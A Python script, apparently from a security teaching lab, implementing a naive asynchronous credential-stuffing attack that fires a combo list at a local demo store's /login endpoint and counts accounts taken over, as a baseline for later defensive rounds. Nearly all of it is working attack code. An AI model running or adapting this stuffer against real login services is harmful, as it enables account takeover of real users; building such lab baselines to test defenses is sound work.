"""Round 0 attack — naive async credential stuffer.

The baseline the whole chapter pushes against: one machine, one IP, maximum
concurrency, the raw 2000-pair combo list fired at /login. Against an undefended
endpoint it simply walks the list and collects every valid pair. It is also the
easiest thing in the world to throttle, which is the point of Round 1.

Run (with the demo store up at DEFENSE_LEVEL=0):
    python attacks/round0_naive_stuffer.py
"""

from __future__ import annotations

import asyncio

import httpx

from _common import BASE_URL, edge_headers, is_success, load_combos, require_local_target

ATTACKER_IP = "198.51.100.10"   # one datacenter address (documentation range)
CONCURRENCY = 20
ACTOR = "bot:round0"


async def run() -> dict:
    require_local_target(BASE_URL)
    combos = load_combos()
    hits: list[str] = []
    sem = asyncio.Semaphore(CONCURRENCY)

    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
        async def attempt(email: str, pw: str):
            async with sem:
                try:
                    r = await client.post("/login", json={"email": email, "password": pw},
                                          headers=edge_headers(ACTOR, ATTACKER_IP))
                    if is_success(r):
                        hits.append(email)
                except httpx.RequestError:
                    pass

        await asyncio.gather(*(attempt(e, p) for e, p in combos))

    return {"attack": ACTOR, "attempts": len(combos), "accounts_taken_over": len(hits),
            "hits": sorted(hits)}


def main():
    result = asyncio.run(run())
    print(f"[{result['attack']}] {result['attempts']} attempts -> "
          f"{result['accounts_taken_over']} accounts taken over")


if __name__ == "__main__":
    main()
